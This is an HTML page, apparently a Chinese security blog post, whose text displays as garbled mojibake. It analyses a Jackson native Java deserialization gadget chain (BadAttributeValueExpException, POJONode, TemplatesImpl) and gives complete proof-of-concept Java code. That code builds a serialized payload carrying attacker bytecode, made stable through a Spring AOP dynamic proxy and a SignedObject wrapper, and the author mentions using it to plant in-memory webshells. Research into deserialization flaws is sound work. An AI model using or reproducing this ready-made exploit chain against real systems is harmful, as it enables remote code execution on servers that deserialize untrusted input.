<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>jacksonåŸç”Ÿé“¾ | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="ç¯å¢ƒ jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼ŒPOJONodeä¸­ä»£ç ä¼šä¸å¯¹ &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="jacksonåŸç”Ÿé“¾" />
<meta property="og:description" content="ç¯å¢ƒ jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼ŒPOJONodeä¸­ä»£ç ä¼šä¸å¯¹ &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-14T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-14T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="jacksonåŸç”Ÿé“¾"/>
<meta name="twitter:description" content="ç¯å¢ƒ jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼ŒPOJONodeä¸­ä»£ç ä¼šä¸å¯¹ &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "jacksonåŸç”Ÿé“¾",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "jacksonåŸç”Ÿé“¾",
  "name": "jacksonåŸç”Ÿé“¾",
  "description": "ç¯å¢ƒ jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼ŒPOJONodeä¸­ä»£ç ä¼šä¸å¯¹ \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 writeValueAsString è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹",
  "keywords": [
    
  ],
  "articleBody": "ç¯å¢ƒ jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼ŒPOJONodeä¸­ä»£ç ä¼šä¸å¯¹\ncom.fasterxml.jackson.core jackson-databind 2.15.0 com.fasterxml.jackson.core jackson-core 2.15.0 com.fasterxml.jackson.core jackson-annotations 2.15.0 javassist javassist 3.12.1.GA 0x01 writeValueAsString è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹è·ŸwriteValueAsString()æœ‰å…³ï¼Œä»–ç”¨æ¥å°†javaå¯¹è±¡åºåˆ—åŒ–æˆjsonå­—ç¬¦ä¸²ï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨javaå¯¹è±¡çš„getteræ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œçœ‹ä¸‹åºåˆ—åŒ–çš„æ—¶å€™æ˜¯æ€ä¹ˆè°ƒç”¨getteræ–¹æ³•çš„\n_accessorMethod = (Method) member.getMember(); è®¾ç½®getteræ–¹æ³•ï¼Œè°ƒç”¨æ ˆ\n\u003cinit\u003e:234, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) buildWriter:229, PropertyBuilder (com.fasterxml.jackson.databind.ser) _constructWriter:791, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanProperties:583, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) constructBeanSerializer:368, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanSerializer:279, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createSerializer2:231, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) createSerializer:165, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createUntypedSerializer:1385, SerializerProvider (com.fasterxml.jackson.databind) _createAndCacheUntypedSerializer:1336, SerializerProvider (com.fasterxml.jackson.databind) findValueSerializer:510, SerializerProvider (com.fasterxml.jackson.databind) findTypedValueSerializer:713, SerializerProvider (com.fasterxml.jackson.databind) serializeValue:308, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) final Object value = (_accessorMethod == null) ? _field.get(bean) : _accessorMethod.invoke(bean, (Object[]) null); getteræ–¹æ³•åå°„è°ƒç”¨ï¼Œåªè°ƒç”¨æ— å‚æ–¹æ³•\ngetJack:31, Person2 (jackson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) serializeAsField:687, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) serializeFields:719, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std) serialize:155, BeanSerializer (com.fasterxml.jackson.databind.ser) _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) å¯¹æ¯”ä¸‹è°ƒç”¨æ ˆï¼Œå¤§æ¦‚æµç¨‹å°±æ˜¯\nwriteValueAsString()ä¸€ç›´åˆ°=\u003eDefaultSerializerProvider#serializeValue\nè¿™é‡ŒfindTypedValueSerializer()ä¼šå…ˆå¯¹Filedå’ŒMethodï¼ˆåŒ…å«setterå’Œgetterï¼‰ï¼Œè¿›è¡Œåˆå§‹åŒ–\nåœ¨_serialize()åå°„è°ƒç”¨è¿™äº›Filedå’ŒMethodï¼ˆæµ‹è¯•å‘ç°ï¼Œæœ‰å±æ€§çš„getteræ–¹æ³•å’Œæ²¡æœ‰å±æ€§çš„getteræ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ï¼‰\nè°ƒç”¨çš„æ—¶å€™ï¼Œåœ¨BeanSerializerBase#serializeFieldsä¼šé€šè¿‡foréœ€è¦æ ¹æ®å‰é¢åˆå§‹åŒ–çš„propè°ƒç”¨serializeAsFieldï¼Œæ³¨æ„ï¼Œè¿™é‡Œjackä¹Ÿæœ‰è‡ªå·±propå°½ç®¡ä»–æ²¡æœ‰å±æ€§ï¼Œä½†æ˜¯ä»–æœ‰getterï¼Œå‰é¢èµ‹å€¼ä¼˜å…ˆèµ‹å€¼ç»™Methodï¼Œæ‰€ä»¥ä»–ä¹Ÿæœ‰è‡ªå·±propï¼Œæœ€åè°ƒç”¨getJack()\nä½œä¸ºGadgetsçš„ä¸€ç¯ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„ä½œç”¨å°±æ˜¯è°ƒç”¨ä»»æ„ç±»getteræ–¹æ³•å˜›ï¼Œæ— ç–‘GadgetsååŠæ®µå°±æ˜¯TemplatesImpl.getOutputProperties()\n0x02 POJONode POJONodeçš„toStringå¯ä»¥è°ƒç”¨writeValueAsString()ï¼Œä¸”å¯¹è±¡å¯æ§ï¼Œæˆ‘ä»¬æ€ä¹ˆè°ƒç”¨toStringå‘¢ï¼Œè¿™é‡Œä¸éš¾æƒ³åˆ°åˆ©ç”¨CC5çš„BadAttributeValueExpExceptionï¼Œé‚£ä¹ˆGadgetså°±å®Œæ•´å•¦\nInternalNodeMapper#nodeToString 0x03 Gadgets BadAttributeValueExpException.readObject POJONode.toString InternalNodeMapper#nodeToString writeValueAsString() TemplatesImpl.getOutputProperties() é—®é¢˜1 writeReplace() æˆ‘ä»¬æ»¡å¿ƒæ¬¢å–œæ„é€ å¥½pocåï¼Œå‘ç°åºåˆ—åŒ–çš„æ—¶å°±é€€å‡ºç¨‹åºäº†ï¼Œå¸¸è§„ååºåˆ—åŒ–è¿™ä¸ªåœ°æ–¹ä¼šè°ƒç”¨writeReplace()\nwriteReplace()è¿™é‡Œå’ŒtoString()å¯ä»¥èµ·åˆ°ä¸€æ ·çš„æ•ˆæœï¼Œåé¢ä¼šè°ƒç”¨åˆ°writeValueAsBytes(),åç»­ä¼šæå‰è°ƒç”¨getteræ–¹æ³•ï¼Œç„¶åæŠ¥é”™ä¸­æ–­\nè§£å†³ï¼š\nè‡ªæ„ä¸€ä¸ªBaseJsonNodeå°†writeReplace()åˆ é™¤ //è¿™é‡Œåº”è¯¥æ˜¯è·ŸClassloadåŠ è½½çš„é—®é¢˜æœ‰å…³ï¼Œåé¢ç•™ä¸ªå‘\næ„é€ ä¸ªä¸€æ ·è·¯å¾„çš„ï¼Œç„¶åå°±å¯ä»¥æ‰“æˆåŠŸå•¦\npackage jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(badAttributeValueExpException); oos.close(); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } ç½‘ä¸Šè¯´è¿™ä¸ªä¸ç¨³å®šï¼Œæœ¬åœ°è¯•äº†10æ¬¡éƒ½æ²¡é—®é¢˜ï¼Œå°±å…ˆä¸çœ‹\nå­˜æ¡£1 BaseJsonNode ä¸ºä»€ä¹ˆæœ¬åœ°é‡å†™BaseJsonNodeå¯ä»¥è§£å†³é—®é¢˜1\n0x04 ä¸ç¨³å®š ä¹‹å‰è¯´ä¸€ç›´æ²¡é‡åˆ°hhhï¼Œåé¢æ‰“å†…å­˜é©¬çš„æ—¶å€™å‡ºç°äº†å¥½å‡ æ¬¡è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥æ¥è¡¥ä¸‹è¿™ä¸ªå‘ã€‚å› ä¸ºè¿™ä¸ªæ˜¯æ¦‚ç‡è§¦å‘ï¼Œæ‰€ä»¥ä¸å¤ªå¥½æˆªå›¾\näº§ç”Ÿçš„åŸå› å‘¢æ˜¯åœ¨jacksonè‡ªå·±çš„åºåˆ—åŒ–ä¸­ï¼Œçœ‹åˆ°serializeFields()\nè¿™é‡Œæ˜¯forå¾ªç¯ï¼Œpropsæ˜¯ä¹‹å‰èµ‹å€¼çš„ï¼Œç„¶åæ ¹æ®filedçš„åå­—è°ƒç”¨å»è·å–å¯¹åº”çš„å€¼ï¼Œè¿™é‡Œåé¢å°±æ˜¯è°ƒç”¨å¯¹åº”çš„getteræˆ–è€…åå°„è·å–filedå€¼äº†ï¼Œé—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªpropså€¼çš„é¡ºåºä¸Šï¼Œå¦‚æœç¬¬ä¸€ä¸ªå€¼æ˜¯outputPropertiesï¼Œæœ€å…ˆè°ƒç”¨çš„å°±æ˜¯getOutputProperties()è‡ªç„¶å°±å¯ä»¥è°ƒç”¨æˆåŠŸã€‚\nä½†æ˜¯å¦‚æœæ˜¯å…¶ä»–å€¼å°±ä¼šæœ‰é—®é¢˜ï¼Œè¿™é‡Œå€¼åˆ†åˆ«æ˜¯stylesheetDOMï¼ŒtransletIndex\nè¿™ä¸¤ä¸ªå€¼å¯¹åº”ä¸¤ä¸ªgetteræ–¹æ³•getStylesheetDOM(),getTransletIndex()\npublic DOM getStylesheetDOM() { return (DOM)_sdom.get(); } public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } å¦‚æœå…ˆgetTransletIndex()å†getOutputProperties()ä¹Ÿæ²¡äº‹ï¼ŒgetTransletIndex()åªæ˜¯å¸®å¿™åŠ è½½äº†å­—èŠ‚ç ï¼Œä¸ä¼šç…§æˆå½±å“ã€‚\næœ‰é—®é¢˜åªæœ‰ä¸€ç§åœºæ™¯ï¼ŒgetStylesheetDOMåœ¨getOutputPropertieså‰é¢è°ƒç”¨\nè¿™ä¸ªæ—¶å€™ä¼šåœ¨æ¶æ„ç±»å®ä¾‹åŒ–å‰è°ƒç”¨getStylesheetDOM()ï¼Œè€Œ_sdomæ˜¯nullï¼Œä¼šæŠ¥ç©ºæŒ‡é’ˆçš„é”™è¯¯\né‚£å¾ˆç®€å•å‘€æˆ‘ä»¬ç»™ä»–èµ‹äºˆä¸€ä¸ªå€¼ä¸å°±è¡Œäº†ï¼Œå…¶å®ä¸èƒ½wwwww\næˆ‘ä»¬çœ‹åˆ°TemplatesImplå…¶å®ä¼šç»™è¿™ä¸ªèµ‹äºˆä¸€ä¸ªThreadLocalå®ä¾‹ï¼Œé‚£ä¸ºä»€ä¹ˆæ˜¯nullå‘¢\nprivate transient ThreadLocal _sdom = new ThreadLocal(); è¿™é‡Œæ˜¯ååºåˆ—åŒ–å˜›ï¼Œé—®é¢˜å¯èƒ½å°±å‡ºåœ¨è¿™é‡Œ\nå¯ä»¥çœ‹åˆ°TemplatesImplè¿™é‡Œæ˜¯ä¸ä¼šåºåˆ—åŒ–_sdomè¿™ä¸ªå€¼çš„ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„åœ°æ–¹ä¹Ÿä¸ä¼šèµ‹å€¼è¿™ä¸ªfiledï¼Œæ‰€ä»¥ä»–æ˜¯null\nè§£å†³ ä½†æ˜¯æˆ‘ä»¬ä¸éš¾æƒ³åˆ°getOutputPropertiesæ˜¯ç»§æ‰¿çš„Templatesæ¥å£ï¼Œä»–åªæœ‰è¿™ä¸€ä¸ªgetterå‘€ï¼Œèƒ½ä¸èƒ½æ¢æˆä»–å‘¢ï¼ˆè¿™é‡Œè¯•è¿‡ç±»å‹è½¬æ¢ï¼Œæ²¡ç”¨ï¼‰\nè§£å†³åŠæ³•æ˜¯ç”¨åˆ°åŠ¨æ€ä»£ç†ï¼Œç„¶åä»£ç†Templatesæ¥å£ï¼Œä½¿å¾—propsåªæœ‰getOutputPropertiesè¿™ä¸ªæ–¹æ³•ï¼ŒProxyè°ƒç”¨getOutputProperties(),è§¦å‘ä»£ç†è°ƒç”¨invokeæ–¹æ³•ï¼Œå¦‚æœè¿™ä¸ªä»£ç†ç±»invokeæ–¹æ³•å¯ä»¥è®¾ç½®æˆ‘ä»¬çš„TemplatesImplå¯¹è±¡æ¥è°ƒç”¨getOutputProperties()é—®é¢˜å°±è§£å†³äº†\nè¿™é‡Œéœ€è¦è¡¥å……ç‚¹ä¸œè¥¿ï¼Œæˆ‘ä»¬çŸ¥é“åºåˆ—åŒ–ä¼šè°ƒç”¨getterï¼Œä¹‹å‰åˆ†ææµç¨‹å¯èƒ½ä¸å¤Ÿç»†\njacksonçš„åˆå§‹åŒ–ï¼Œæœ€åˆä¼šåœ¨AnnotatedMethodCollector.java#_addMemberMethodsï¼Œæ‰¾åˆ°ç±»æ‰€æœ‰æ–¹æ³•å¹¶put\nè¿™é‡Œæ˜¯è·å–ä»£ç†çš„æ–¹æ³•ï¼Œæœ€ç»ˆå…¶å®æ˜¯é€šè¿‡åå°„getDeclaredMethods()è·å–çš„ï¼Œä½†æ˜¯å…¶è·å–æ–¹æ³•å¾—åˆ°çš„é¡ºåºæ¯æ¬¡å¯èƒ½å­˜åœ¨ä¸€äº›åå·®ï¼Œè¿™ä¹Ÿæ˜¯jacksoné“¾å­ä¸ç¨³å®šçš„åŸå› \npublic static Method[] getClassMethods(Class\u003c?\u003e cls) { try { return cls.getDeclaredMethods(); } ä¸€å…±æ˜¯5ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯hashcode,equals,toString,getOutputProperties,newTransformer\nè¿™é‡Œæˆ‘ä»¬ç”¨javaçš„åå°„ getDeclaredMethods æ–¹æ³•å»è·å–ä»£ç†ç±»æ‰€æœ‰æ–¹æ³•æ—¶ä¹Ÿæ˜¯æ ¹æ®æˆ‘ä»¬æä¾›çš„æ¥å£ï¼ˆè¿™é‡Œæ˜¯Templates.classï¼‰å»è·å–çš„æ–¹æ³•ã€‚ï¼Œæ‰€ä»¥åªæœ‰ä¸Šé¢5ä¸ªæ–¹æ³•ï¼Œå…¶ä»–3ä¸ªæ–¹æ³•è‡ªå¸¦çš„éƒ½ä¼šæœ‰ï¼Œç„¶ågetterå°±åªæœ‰getOutputProperties\nObject proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); ç„¶åå°†è·å–çš„æ–¹æ³•è¿”å›ï¼Œè¿™é‡Œä¼šå°è¯•æ·»åŠ åˆ°propsé‡Œï¼Œåªæœ‰getOutputPropertiesæ·»åŠ äº†\nç„¶ååé¢å…¶ä»–çš„èµ‹å€¼å°±åªæœ‰getOutputPropertiesè¿™ä¸€ä¸ªgetteræ–¹æ³•äº†\n0x05 JdkDynamicAopProxy org.springframework.aop.framework.JdkDynamicAopProxyéœ€è¦aopä¾èµ–\nè¿™ä¸ªç±»æœ‰å•¥ç”¨å‘¢ï¼Œé€šè¿‡å‰é¢çš„å¤„ç†å¯ä»¥åªè°ƒç”¨getOutputProperties()ï¼Œè°ƒç”¨åè§¦å‘ä»£ç†ç±»invoke()æ–¹æ³•ï¼Œå…¶ä¸­åœ¨invokeJoinpointUsingReflection()å¤„ä¼šåå°„è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼ˆgetOutputPropertiesï¼‰\næˆ‘è¿™é‡Œç¼©å‡ä¸‹ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶è¿™é‡Œtargetï¼Œtargetæ¥è‡ªtargetSourceï¼ŒtargetSourceæœ‰æ¥åˆå§‹åŒ–è®¾ç½®çš„this.advised\nTargetSource targetSource = this.advised.targetSource; target = targetSource.getTarget(); è¿™é‡Œæˆ‘ä»¬å°†TemplatesImplè¿›è¡ŒAdvisedSupportå°è£…æ”¾å…¥å¯¹åº”çš„å€¼ï¼Œåå°„æ—¶å°±èƒ½è°ƒç”¨åˆ°æˆ‘ä»¬æ”¾å…¥çš„TemplatesImplå¯¹è±¡\nClass\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); 0x06 poc package jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.security.*; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Evil.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); Class\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); // ç”Ÿæˆç§é’¥å’Œå…¬é’¥ KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\"RSA\"); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // åˆ›å»ºç­¾åå¼•æ“ Signature signingEngine = Signature.getInstance(\"SHA256withRSA\"); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); BadAttributeValueExpException bad=new BadAttributeValueExpException(111); setFiled(bad,\"val\",node); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(bad); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ String base64EncodedData = \"\"; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // ååºåˆ—åŒ– ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 0x07 å¦ä¸€ç§è§¦å‘tostring é™¤äº†ç”¨ä¸Šé¢CC5æ¥è§¦å‘tostringæ–¹æ³•è¿˜æœ‰å…¶ä»–é“¾å­ï¼Œorg.springframework.aop.target.HotSwappableTargetSource.java(HSTS)ï¼Œè¿™ä¸ªç±»æ˜¯spring aopæ¨¡å—çš„\nè¿™é‡Œæ˜¯çœ‹secobjè¿™é“å’Œjacksonç›¸å…³çš„ååºåˆ—åŒ–é¢˜æ¥è§¦åˆ°çš„ï¼Œè¿™é‡Œçœ‹åˆ°é“¾å­\nHashMap#readObject -\u003e HashMap#putVal -\u003e HotSwappableTargetSource#equals -\u003e XString#equals -\u003ePOJONode#toString 